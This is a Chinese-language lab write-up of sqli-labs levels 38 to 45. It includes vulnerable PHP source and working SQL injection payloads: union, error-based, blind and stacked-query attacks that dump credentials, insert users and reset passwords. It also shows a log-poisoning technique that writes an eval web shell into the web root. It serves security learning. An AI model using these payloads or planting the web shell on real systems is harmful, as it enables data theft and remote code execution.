### 第三十八关
源码
<?php  
// take the variables if(isset($_GET['id']))  
{  
$id=$_GET['id'];  
//logging the connection parameters to a file for analysis.  
$fp=fopen('result.txt','a');  
fwrite($fp,'ID:'.$id."\n");  
fclose($fp);  
  
// connectivity  
//mysql connections for stacked query examples.  
$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);  
// Check connection  
if (mysqli_connect_errno($con1))  
{  
    echo "Failed to connect to MySQL: " . mysqli_connect_error();  
}  
else  
{  
    @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database: $dbname");  
}  
  
  
  
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";  
/* execute multi query */  
if (mysqli_multi_query($con1, $sql))  
{  
      
      
    /* store first result set */  
    if ($result = mysqli_store_result($con1))  
    {  
        if($row = mysqli_fetch_row($result))  
        {  
            echo '<font size = "5" color= "#00FF00">';    
            printf("Your Username is : %s", $row[1]);  
            echo "<br>";  
            printf("Your Password is : %s", $row[2]);  
            echo "<br>";  
            echo "</font>";  
        }  
//            mysqli_free_result($result);  
    }  
        /* print divider */  
    if (mysqli_more_results($con1))  
    {  
            //printf("-----------------\n");  
    }  
     //while (mysqli_next_result($con1));  
}  
else   
{  
    echo '<font size="5" color= "#FFFF00">';  
    print_r(mysqli_error($con1));  
    echo "</font>";    
    }  
/* close connection */  
mysqli_close($con1);  
  
  
}  
    else { echo "Please input the ID as parameter with numeric value";}  
  
?>


关键函数语句
```sql
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
if (mysqli_multi_query($con1, $sql)){...}
```
堆叠注入的关键就在于`mysqli_multi_query`，这个函数可以执行多条查询语句需要使用;分割
	例如(查询语句);(插入语句)
	
方法一
	爆字段?id=1' order by 4--+
	![](../img/Pasted%20image%2020250728123336.png)
	爆显错位?id=-1' union select 1,2,3 -- qwe![](../img/Pasted%20image%2020250728123441.png)
	这里可以用老方法联合注入直接获取数据?id=-1' union select 1,group_concat('%',id,username),3 from security.users-- qwe![](../img/Pasted%20image%2020250728123612.png)
方法二：堆叠注入
	构造插入语句?id=-1' ;insert into security.users (id,username,password) values ('16','wjj','wjj') -- qwe
	查询数据?id=-1' union select 1,group_concat('%',id,username),3 from security.users-- qwe可以发现新增数据
	![](../img/Pasted%20image%2020250728124148.png)
方法三:开启日志插入一句话木马
	另外我们还可以利用堆叠注入，修改mysql配置例如打开mysql日志，然后访问一句换木马就可直接写入MySQL的日志中，然后就插入木马成功
	打开日志
		`?id=1'; set global general_log=on;-- qwe`
	为了方便实验修改日志路径（日志文件应该放入网站根目录下）
		`?id=1';set global general_log_file='C:\\phpstudy_pro\\WWW\\sqli-labs-master\\sqli-labs-master\\log.php';--+`
		![](../img/Pasted%20image%2020250728130221.png)
	访问一句话木马就会被记录在日志中
		`?id=<?php @eval($_POST["cmd"]);?>`注意这里cmd的引号不能为''，应为会胡乱闭合，本关本就是单引号闭合
		![](../img/Pasted%20image%2020250728130743.png)成功
### 第三十九关
源码与上一关的区别在于闭合，这一关为数字型闭合
报错注入
	直接查数据
		`?id=-1 and updatexml(1,(select group_concat('%',id,username) from security.users),1) -- qwe`
联合注入
	直接查数据`?id=-1 union select 1,group_concat('%',id,username),3 from security.users-- qwe`
	![](../img/Pasted%20image%2020250728131207.png)
验证堆叠注入
	`?id=-1 ;insert into security.users (id,username,password) values ('18','666','666') -- qwe`
	`?id=-1 union select 1,group_concat('%',id,username),3 from security.users-- qwe`![](../img/Pasted%20image%2020250728131446.png)成功
### 第四十关
依旧是闭合不同罢了`$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";`
联合注入
	`?id=-1') union select 1,group_concat('%',id,username),3 from security.users-- qwe`
堆叠注入
	`?id=-1') ;insert into security.users (id,username,password) values ('18','666','666') -- qwe`
	`?id=-1') union select 1,group_concat('%',id,username),3 from security.users-- qwe`
### 第四十一关与三十九关一样几乎，只是不能使用报错注入
联合注入
	直接查数据`?id=-1 union select 1,group_concat('%',id,username),3 from security.users-- qwe`
验证堆叠注入
	`?id=-1 ;insert into security.users (id,username,password) values ('18','666','666') -- qwe`
	`?id=-1 union select 1,group_concat('%',id,username),3 from security.users-- qwe`
### 第四十二关
源码中的重要信息
```
$username = mysqli_real_escape_string($con1, $_POST["login_user"]);  
$password = $_POST["login_password"];
$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
```

mysqli_real_escape_string()这个函数让我想起了宽字节注入，但是没有发现mysql_query("SET NAMES gbk");  所以不满足宽字节注入的前提条件。
而且我还发现这里只对username进行了转义，并没有对password进行转义，因此注入点在password
万能密码
	登陆1' or 1=1 #
	![](../img/Pasted%20image%2020250728144428.png)
	证明密码框的确是注入点
修改Dumb密码方式一：查询Dumb密码然后在密码更改页面进行修改
	报错注入
		`1' and updatexml(1,(select group_concat('%',id,0x5e,username,0x5e,password) from security.users),1) #`
		![](../img/Pasted%20image%2020250728145426.png)
使用堆叠注入修改Dumb密码：
	`1';update security.users set password='1111' where username='Dumb' # `
	![](../img/Pasted%20image%2020250728145954.png)
	成功
### 第四十三关相比于第四十二关只修改了闭合方式
万能密码
	登陆1') or 1=1 #
	1') or 1=1 #
报错注入
	`1') and updatexml(1,(select group_concat('%',id,0x5e,username,0x5e,password) from security.users),1) #`
堆叠注入
	`1');update security.users set password='1111' where username='Dumb' # `
### 第四十四关
源码
![](../img/Pasted%20image%2020250728151409.png)![](../img/Pasted%20image%2020250728151502.png)![](../img/Pasted%20image%2020250728151526.png)
因此这里也存在现错位可以使用常规注入
```万能密码登陆
	'or 1=1 #
	拿回显位
	' union select 1,2,3#
	拿库名
	' union select 1,database(),3#
	拿表名
	' union select 1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),3#
	拿列名
	' union select 1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),3#
	拿用户名
	' union select 1,(select group_concat(username) from security.users),3#
```
盲注
```
	获取数据库长度
	'or length(database())=8 -- a
	一步一步获取数据库具体名字，第一个字母s,ascii值为115
	'or ascii(substr(database(),1,1))=115-- aaa
	 一步一步获取数据表名字,第一个字母为e,ascii值为101
	'or ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))=101 -- aaa`	
```
利用堆叠注入日志中插入一句话木马
	`<?php phpinfo();?>`
	![](../img/Pasted%20image%2020250728152524.png)成功
### 第四十五关
闭合不同其它不变闭合为('')
```
万能密码
1') or 1=1 #
联合注入
	拿用户名
	1') union select 1,group_concat('%',id,username),3 from security.users #
盲注
	获取数据库长度
	') or length(database())=8 #
	一步一步获取数据库具体名字，第一个字母s,ascii值为115
	') or ascii(substr(database(),1,1))=115 #
	 一步一步获取数据表名字,第一个字母为e,ascii值为101
	') or ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))=101 #`	
堆叠注入
	打开日志
		?id=1'); set global general_log=on;#
	为了方便实验修改日志路径（日志文件应该放入网站根目录下）
		?id=1');set global general_log_file='C:\\phpstudy_pro\\WWW\\sqli-labs-master\\sqli-labs-master\\log.php';#
	上传代码
	<?php phpinfo();?>
```